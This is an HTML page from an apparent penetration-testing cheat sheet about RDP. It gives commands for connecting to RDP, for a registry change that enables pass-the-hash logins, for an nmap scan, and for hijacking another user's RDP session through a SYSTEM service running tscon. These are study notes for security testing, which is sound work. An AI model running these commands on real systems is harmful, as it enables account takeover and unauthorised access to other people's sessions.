<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Pentest CheatSheet | Pentest CheatSheet</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Pentest CheatSheet" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Pentest CheatSheet" />
<meta property="og:description" content="Pentest CheatSheet" />
<link rel="canonical" href="http://localhost:4000/zNew/Services/RDP.html" />
<meta property="og:url" content="http://localhost:4000/zNew/Services/RDP.html" />
<meta property="og:site_name" content="Pentest CheatSheet" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Pentest CheatSheet" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/Services/RDP.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Pentest CheatSheet</h1>
        </a>
        <h2>Pentest CheatSheet</h2>

        <section id="downloads">
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="interacting">Interacting</h1>
<h2 id="connecting">Connecting</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ClearPassword</span>
<span class="nv">$ </span>xfreerdp /v:&lt;target-IP&gt; /d:&lt;domain&gt; /u:&lt;username&gt; /p:&lt;password&gt;

<span class="c"># PTH</span>
<span class="o">&gt;</span> reg add HKLM<span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\L</span>sa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
<span class="nv">$ </span>xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;<span class="nb">hash</span><span class="o">&gt;</span> /v:&lt;ip&gt;
</code></pre></div></div>

<h1 id="footprinting">Footprinting</h1>
<h2 id="nmap">Nmap</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> 10.129.201.248 <span class="nt">-p3389</span> <span class="nt">--script</span> rdp<span class="k">*</span>
</code></pre></div></div>

<h1 id="rdp-session-hijacking">RDP Session Hijacking</h1>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; query user
</code></pre></div></div>
<p>As shown in the example below, we are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.</p>

<p>To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session). So, for example, the following command will open a new console as the specified SESSION_ID within our current RDP session:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
</code></pre></div></div>

<p>If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
</code></pre></div></div>

<p>To run the command, we can start the sessionhijack service :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; net start sessionhijack
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Note: This method no longer works on Server 2019.</code></p>

      </section>
    </div>
  </body>
</html>